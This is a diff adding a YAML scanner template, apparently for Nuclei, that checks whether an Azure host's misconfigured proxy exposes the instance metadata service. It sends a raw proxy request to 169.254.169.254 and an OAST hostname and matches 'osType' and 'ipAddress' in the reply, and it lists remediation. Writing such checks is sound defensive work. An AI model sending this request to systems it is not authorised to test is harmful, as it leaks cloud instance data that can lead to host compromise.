@@ -1,0 +1,47 @@
+id: metadata-service-azure
+
+# This attack abuses a misconfigured proxy that allows access to the metadata
+# IP or a name which resolves to the IP. A standard proxy request is made to
+# the proxy using the full metadata URL, which the proxy will fulfill to its
+# own metadata service.
+#
+# The proxy may also be vulnerable to host/port enumeration on localhost or
+# inside the private network.
+info:
+  name: Microsoft Azure Cloud Metadata Service Check
+  author: sullo
+  severity: critical
+  description: The Microsoft Azure cloud host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.
+  remediation: Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.
+  reference:
+    - https://docs.microsoft.com/en-us/azure/virtual-machines/linux/instance-metadata-service?tabs=windows
+    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
+    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  metadata:
+    max-request: 2
+  tags: exposure,config,azure,microsoft,proxy,misconfig,metadata
+
+http:
+  - raw:
+      - |+
+        GET http://{{hostval}}/metadata/instance?api-version=2021-02-01 HTTP/1.1
+        Host: {{hostval}}
+        Metadata: true
+
+    payloads:
+      hostval:
+        - aws.oast.online
+        - 169.254.169.254
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "osType"
+          - "ipAddress"
+        condition: and
+# digest: 4a0a00473045022100f2eda06442c24557cbb3fe6701f1b589bfe5116fd23aa066b63aa566e054c056022029ced6a91add300b2184c7ed266bc3ec48c61175a18ee33d3ee873a1c0f57ce6:922c64590222798bb761d5b6d8e72950
